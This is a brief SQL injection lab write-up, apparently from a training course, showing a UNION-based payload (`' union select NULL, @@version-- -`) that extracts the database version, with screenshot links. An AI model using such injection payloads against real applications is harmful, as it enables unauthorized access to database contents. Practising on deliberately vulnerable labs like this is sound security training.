### Eight Exercise 👆


![problem.PNG](/assets/SQLi/Eight/problem.PNG)


#### **To do**

```
To solve the lab, display the database version string. 
```


1. Use `@@version`
```sql
' union select NULL, @@version-- -
```


**Output**
![version-PNG](/assets/SQLi/Eight/version.PNG)